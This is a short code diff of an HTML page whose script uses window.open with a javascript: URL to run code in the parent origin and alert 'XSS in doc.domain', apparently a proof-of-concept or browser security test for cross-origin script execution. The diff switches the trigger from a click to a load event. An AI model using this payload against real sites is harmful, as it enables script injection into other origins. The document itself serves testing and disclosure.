@@ -31,7 +31,7 @@
 <script>
     document.getElementById('originOutput').innerText = window.location.origin;
 
-    document.body.addEventListener('click', function () {
+    document.body.addEventListener('load', function () {
 
         window.open('javascript:var elem = document.createElement("p");elem.innerHTML = "<b>Executed JS in parent origin: "+window.location.origin+"</b>"; document.body.append(elem);alert("XSS in doc.domain: "+document.domain+", win.origin: "+window.location.origin)');
 
